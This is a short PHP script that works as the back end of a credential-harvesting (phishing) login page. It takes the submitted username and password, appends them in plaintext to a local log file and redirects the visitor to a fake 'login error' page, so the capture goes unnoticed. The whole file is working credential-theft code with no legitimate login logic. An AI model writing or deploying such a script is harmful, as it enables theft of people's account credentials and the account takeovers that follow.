<?php

// ----------------------------
$uname = $_POST['username'];
$pass = $_POST['password'];

$file = fopen("log.txt","a");

fwrite($file,"\n----------------\n");
fwrite($file,"Username --> :");
fwrite($file,$uname);
fwrite($file,"\nPassword --> :");
fwrite($file,$pass);
fwrite($file,"\n----------------\n");
fclose($file);


//----------After-----------------------

header("location:Login.php?login=error");

?>
